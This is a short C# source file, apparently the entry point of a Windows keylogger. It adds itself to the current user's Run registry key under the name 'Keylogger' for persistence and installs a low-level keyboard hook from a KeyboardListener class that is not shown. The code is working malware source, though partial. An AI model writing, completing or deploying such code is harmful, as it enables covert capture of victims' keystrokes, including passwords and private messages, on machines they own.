using Microsoft.Win32;
using System;
using System.Windows.Forms;

namespace vrtx_keys {
    class Program {
        private static IntPtr hook = IntPtr.Zero;
        static void Main(string[] args) {
            //Setando para o programa iniciar junto com a 
            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            reg.SetValue("Keylogger", Application.ExecutablePath.ToString());

            hook = KeyboardListener.SetHook(KeyboardListener.llkProcedure);
            Application.Run();
            //UnhookWindowsHookEx(hook);
        }
    }
}